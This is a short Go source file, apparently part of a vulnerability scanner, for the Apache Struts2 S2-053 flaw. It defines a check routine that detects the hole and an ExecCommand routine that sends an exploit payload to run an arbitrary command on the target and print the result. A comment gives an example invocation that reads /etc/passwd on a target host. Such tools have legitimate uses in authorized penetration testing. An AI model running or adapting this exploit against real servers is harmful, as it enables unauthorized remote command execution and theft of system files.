package s2_053

import (
    "fmt"
    "github.com/fatih/color"
    "github.com/yhy0/ChYing/pkg/Jie/scan/Pocs/java/struts2/utils"
    "net/url"
)

/*
ST2SG.exe --url http://192.168.123.128:8080/S2-053/ --vn 53 --data "name=fuckit" --mode exec --cmd "cat /etc/passwd"
*/

func Check(targetUrl string, postData string) {
    respString := utils.PostFunc4Struts2(targetUrl, postData, "", utils.POC_s053_check)
    if utils.IfContainsStr(respString, "6308") {
        color.Red("*Found Struts2-053！")
    } else {
        fmt.Println("Struts2-053 Not Vulnerable.")
    }
    
}
func ExecCommand(targetUrl string, command string, postData string) {
    respString := utils.PostFunc4Struts2(targetUrl, postData, "", utils.POC_s053_exec(command))
    execResult := utils.GetBetweenStr(respString, "s053execstart", "s053execend")
    fmt.Println(url.QueryUnescape(execResult))
}
